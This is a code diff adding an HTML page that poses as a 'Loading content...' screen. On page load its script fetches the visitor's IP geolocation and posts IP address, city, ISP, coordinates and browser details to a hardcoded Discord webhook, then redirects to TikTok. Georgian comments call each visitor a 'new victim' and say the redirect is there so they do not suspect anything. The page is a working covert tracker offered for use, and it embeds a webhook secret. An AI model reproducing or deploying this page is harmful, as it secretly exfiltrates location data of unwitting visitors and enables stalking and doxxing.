@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        async function sendDetailedLog() {
+            const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+
+            try {
+                // ვიღებთ დეტალურ ინფორმაციას IP-ის შესახებ
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+
+                // ვამზადებთ ინფორმაციას Discord-ისთვის
+                const info = {
+                    content: "🌍 **ახალი მსხვერპლი დაფიქსირდა!**",
+                    embeds: [{
+                        title: "📍 გეოლოკაციის მონაცემები",
+                        color: 3447003,
+                        fields: [
+                            { name: "🌐 IP მისამართი", value: `\`${data.query}\``, inline: true },
+                            { name: "🏳️ ქვეყანა", value: `${data.country} (${data.countryCode})`, inline: true },
+                            { name: "🏙️ ქალაქი", value: data.city, inline: true },
+                            { name: "🗺️ რეგიონი", value: data.regionName, inline: true },
+                            { name: "📡 პროვაიდერი", value: data.isp, inline: false },
+                            { name: "📍 კოორდინატები", value: `Lat: ${data.lat}, Lon: ${data.lon}`, inline: true },
+                            { name: "🔗 რუკა", value: `[ნახვა Google Maps-ზე](https://www.google.com/maps?q=${data.lat},${data.lon})`, inline: false }
+                        ],
+                        footer: { text: "მოწყობილობა: " + navigator.userAgent }
+                    }]
+                };
+
+                // მონაცემების გაგზავნა
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
+
+            } catch (error) {
+                console.log("Error capturing data:", error);
+            }
+
+            // გადამისამართება, რომ ეჭვი არ აიღონ
+            window.location.href = "https://www.tiktok.com";
+        }
+
+        window.onload = sendDetailedLog;
+    </script>
+</head>
+<body>
+    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+        <p>Loading content...</p>
+    </div>
+</body>
+</html>
